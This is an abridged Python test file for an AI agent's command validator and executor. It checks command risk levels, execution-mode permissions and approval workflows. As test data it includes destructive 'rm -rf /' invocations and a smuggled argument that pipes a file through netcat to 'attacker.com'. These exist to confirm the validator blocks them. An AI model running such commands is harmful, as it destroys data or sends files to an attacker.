...
from omnimancer.core.agent.program_executor import (
    EnhancedProgramExecutor, CommandValidator, StreamingExecutor,
    CommandCategory, ExecutionMode, CommandResult, ExecutionConfig,
...
class TestCommandValidator:
    ...
    def test_command_categories(self, command_validator):
        ...
        assert command_validator.get_command_category('cat') == CommandCategory.SAFE_READ
        assert command_validator.get_command_category('grep') == CommandCategory.SAFE_READ
        
        # Development commands
        assert command_validator.get_command_category('git') == CommandCategory.DEVELOPMENT
        assert command_validator.get_command_category('npm') == CommandCategory.DEVELOPMENT
        assert command_validator.get_command_category('python') == CommandCategory.DEVELOPMENT
        
        # Dangerous commands
        assert command_validator.get_command_category('rm') == CommandCategory.DANGEROUS
        assert command_validator.get_command_category('sudo') == CommandCategory.DANGEROUS
        assert command_validator.get_command_category('chmod') == CommandCategory.DANGEROUS
    ...
    def test_execution_mode_permissions(self, command_validator):
        ...
        assert not command_validator.is_command_allowed('rm', ExecutionMode.FULL_ACCESS)  # Still blocked
    ...
    def test_risk_assessment(self, command_validator):
        ...
        assert command_validator.assess_command_risk('cat', ['file.txt']) == RiskLevel.LOW
        
        # Medium risk commands
        assert command_validator.assess_command_risk('git', ['clone', 'repo']) == RiskLevel.MEDIUM
        assert command_validator.assess_command_risk('npm', ['install']) == RiskLevel.MEDIUM
        
        # High risk commands
        assert command_validator.assess_command_risk('curl', ['http://example.com']) == RiskLevel.HIGH
        assert command_validator.assess_command_risk('apt', ['install', 'package']) == RiskLevel.HIGH
        
        # Critical risk commands
        assert command_validator.assess_command_risk('rm', ['-rf', '/']) == RiskLevel.CRITICAL
        assert command_validator.assess_command_risk('sudo', ['rm', 'file']) == RiskLevel.CRITICAL
    
    def test_dangerous_patterns(self, command_validator):
        """Test detection of dangerous command patterns."""
        # Dangerous rm patterns
        assert command_validator.assess_command_risk('rm', ['-rf', '/']) == RiskLevel.CRITICAL
        assert command_validator.assess_command_risk('ls', ['|', 'nc', 'host']) == RiskLevel.CRITICAL
    ...
    def test_argument_validation(self, command_validator):
        ...
        with pytest.raises(SecurityError):
            command_validator.validate_command_args('cat', ['file.txt | nc attacker.com 1234'])
...
class TestEnhancedProgramExecutor:
    ...
    async def test_simple_command_execution(self, program_executor, execution_config):
        ...
        with patch('asyncio.create_subprocess_exec') as mock_subprocess:
            ...
            result = await program_executor.execute_command('echo', ['hello', 'world'], execution_config)
    ...
    async def test_command_validation_failure(self, program_executor, execution_config):
        ...
        result = await program_executor.execute_command('rm', ['-rf', '/'], execution_config)
    ...
    async def test_command_timeout(self, program_executor):
        ...
        config = ExecutionConfig(timeout_seconds=1, require_approval=False, enable_streaming=False)
    ...
    async def test_approval_workflow_integration(self, program_executor):
        ...
        program_executor.approval_workflow.request_approval = AsyncMock(return_value=mock_request)
    ...
    def test_execution_modes(self, command_validator):
        ...
        assert command_validator.is_command_allowed('ls', ExecutionMode.DEVELOPMENT)
        assert command_validator.is_command_allowed('git', ExecutionMode.DEVELOPMENT)
        assert not command_validator.is_command_allowed('docker', ExecutionMode.DEVELOPMENT)
...
async def test_streaming_command_output(program_executor, execution_config):
    ...
    with patch('asyncio.create_subprocess_exec') as mock_subprocess:
        ...
        result = await program_executor.execute_command('echo', ['test'], execution_config)
